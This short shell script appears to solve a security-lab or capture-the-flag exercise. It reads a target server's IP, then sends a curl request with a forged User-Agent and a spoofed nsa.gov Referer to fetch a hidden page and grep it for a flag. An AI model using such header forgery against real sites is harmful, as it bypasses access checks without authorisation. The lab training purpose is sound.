IP=`head -n 1 '../../src/env_IP'`
IP_len=${#IP}
if [[ IP_len -gt 0 ]]
then
  continue
else
  echo "Input server IP address:" 
  read IP
fi

curl -H "User-Agent: ft_bornToSec" --referer https://www.nsa.gov/ http://$IP?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c |
 grep "flag"